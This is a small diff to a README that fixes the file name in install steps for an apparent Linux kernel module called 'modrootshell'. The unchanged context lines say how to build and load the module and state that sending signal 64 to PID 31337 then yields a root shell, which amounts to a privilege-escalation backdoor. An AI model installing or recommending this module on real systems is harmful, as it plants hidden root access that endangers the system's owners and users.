@@ -4,7 +4,7 @@
 # git clone https://github.com/carls0n/modrootshell
 # cd modrootshell
 # make
-# sudo insmod modrootshell
+# sudo insmod modrootshell.ko
 # kill -64 31337 [user defined number in source code] gives a rootshell
 ```
 
